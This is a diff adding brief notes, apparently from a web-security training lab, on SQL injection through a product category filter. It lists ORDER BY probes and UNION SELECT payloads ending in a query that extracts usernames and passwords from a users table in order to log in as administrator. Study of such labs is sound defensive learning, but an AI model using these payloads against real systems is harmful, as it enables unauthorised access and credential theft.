@@ -1,0 +1,22 @@
+SQL injection - product category filter
+Goal - Output usernames and passwords, login as administrator
+
+Analysis:
+
+Determine if injectable, filter?category=Gifts
+
+1. Determine number of columns
+filter?category=Gifts' order by 1--
+filter?category=Gifts' order by 2--
+filter?category=Gifts' order by 3-- -> Results in internal server error, so 2 only
+
+2. Determine data type of columns
+
+select a, b from products where category='Gifts'
+' UNION select 'a', NULL--
+' UNION select 'a', 'a'-- -> both of are type string
+
+' UNION select username, password from users--
+
+select a, b from products where category='Gifts'
+select a, b from products where category='Gifts' UNION select username, password from users--'
